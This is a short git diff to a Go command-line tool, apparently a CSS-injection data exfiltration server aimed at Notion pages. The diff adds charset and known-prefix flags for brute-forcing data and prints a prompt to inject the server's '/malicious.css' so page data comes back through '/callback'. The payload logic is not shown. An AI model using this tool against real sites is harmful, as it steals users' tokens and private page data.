@@ -12,7 +12,6 @@ import (
 
 func main() {
 	var config cssrf.Config
-	config.Charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 	//CMD ROOT
 	var rootCmd = &cobra.Command{Use: "cssrf",
 		Short: "only grab information from notion page. No HTTP ingoing traffic is used to work.",
@@ -37,7 +36,9 @@ func main() {
 			m.Handle("/malicious.css", cssrf.FirstLoad(&config))
 			m.Handle("/waiting", cssrf.Waiting(&config))
 			m.Handle("/callback", cssrf.Callback(&config))
-			fmt.Println("🐿️ Seeking data of lenght:", config.Length)
+			fmt.Println("🐿️ Seeking data")
+			fmt.Printf(color.Italic("Desired length %s\n"), color.Yellow(config.Length))
+			fmt.Printf(color.Italic("Charset used '%s'\n"), color.Yellow(config.Charset))
 			fmt.Printf("🌳 Start server on localhost:%s (%s)\n", config.Port, config.ExternalUrl)
 			fmt.Printf(color.Italic(color.Yellow("→ Inject %s/malicious.css\n")), config.ExternalUrl)
 			if err := s.ListenAndServe(); err != nil && err != http.ErrServerClosed {
@@ -48,6 +49,8 @@ func main() {
 	// FLAGS
 	rootCmd.PersistentFlags().StringVarP(&config.Port, "port", "p", "9292", "server listening port")
 	rootCmd.PersistentFlags().StringVarP(&config.ExternalUrl, "url", "u", "localhost", "external reachable url of the server")
+	rootCmd.PersistentFlags().StringVarP(&config.Charset, "charset", "c", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", "charset use to find data (bruteforce)")
+	rootCmd.PersistentFlags().StringVarP(&config.Prefix, "prefix", "b", "", "already known part of the data to extract")
 	rootCmd.PersistentFlags().IntVarP(&config.Length, "len", "l", 32, "data length to exfiltrate")
 	rootCmd.Execute()
 }
